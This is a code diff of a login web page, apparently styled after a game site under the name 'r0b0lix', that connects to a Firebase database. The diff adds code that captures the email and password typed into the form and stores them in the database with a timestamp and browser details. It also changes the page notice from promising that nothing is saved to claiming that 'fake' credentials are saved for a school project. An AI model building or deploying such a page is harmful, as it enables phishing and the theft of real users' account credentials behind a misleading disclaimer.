@@ -37,7 +37,7 @@
     </form>
 
     <p class="note">
-      This is a safe demo. <strong>No usernames or passwords are saved.</strong>
+      This is a safe demo. <strong>Fake usernames and passwords are saved for school project purposes.</strong>
     </p>
   </div>
 
@@ -47,10 +47,7 @@
     const firebaseConfig = {
       apiKey: "AIzaSyDJ44dj8zYq_Zzh0OQEfzkC__h2c0s3WUU",
       authDomain: "r0b0lix.firebaseapp.com",
-
-      /* FIXED REGION URL 🚀 */
       databaseURL: "https://r0b0lix-default-rtdb.europe-west1.firebasedatabase.app",
-
       projectId: "r0b0lix",
       storageBucket: "r0b0lix.firebasestorage.app",
       messagingSenderId: "497840821640",
@@ -58,7 +55,7 @@
       measurementId: "G-PBQ2G89HR2"
     };
 
-    // Initialize Firebase ONCE
+    // Initialize Firebase
     const app = firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
@@ -68,8 +65,13 @@
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
+      // ⬇️ NEW — store email & password
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
       const logEntry = {
-        result: "success",
+        email: email,
+        password: password,
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent
       };
@@ -86,3 +88,4 @@
 
 </body>
 </html>
+
